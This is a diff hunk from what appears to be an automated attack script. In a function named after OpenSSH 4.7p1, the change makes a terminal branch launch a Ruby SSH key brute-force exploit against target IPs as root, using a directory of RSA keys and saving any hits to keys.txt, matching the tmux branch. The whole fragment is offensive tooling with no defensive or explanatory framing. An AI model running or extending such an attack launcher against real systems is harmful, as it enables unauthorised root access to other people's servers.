@@ -331,7 +331,7 @@ function OpenSSH4_7p1(){
 	then
 		if [ "$tmux" = "bash" ]
 		then
-			gnome-terminal -e "bash -c 'ssh -l root -p 22 -i $key $ips; bash'" 2> /dev/null
+			gnome-terminal -e "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; bash'" 2> /dev/null
 			sleep 10
 		else
 			tmux new-window -n keysAttack "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; read; bash'" \; 2> /dev/null
